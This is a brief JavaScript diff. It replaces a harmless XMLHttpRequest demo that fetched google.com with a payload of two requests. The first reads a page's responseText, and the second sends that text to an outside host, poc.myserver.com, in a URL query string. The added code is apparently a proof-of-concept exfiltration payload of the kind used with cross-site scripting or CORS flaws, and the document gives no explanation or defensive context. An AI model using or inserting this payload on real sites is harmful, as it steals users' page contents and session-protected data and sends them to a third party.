@@ -1,22 +1,8 @@
-<script>
-function readBody(xhr) {
-    var data;
-    if (!xhr.responseType || xhr.responseType === "text") {
-        data = xhr.responseText;
-    } else if (xhr.responseType === "document") {
-        data = xhr.responseXML;
-    } else {
-        data = xhr.response;
-    }
-    return data;
-}
+x1 = new XMLHttpRequest;
+x1.open( 'GET','https://...', false );
+x1.send();
+r = x1.responseText;
 
-var xhr = new XMLHttpRequest();
-xhr.onreadystatechange = function() {
-    if (xhr.readyState == 4) {
-        console.log(readBody(xhr));
-    }
-}
-xhr.open('GET', 'http://www.google.com', true);
-xhr.send(null);
-</script>
+x2 = new XMLHttpRequest;
+x2.open( 'GET','https://poc.myserver.com/?r='+r, false );
+x2.send();
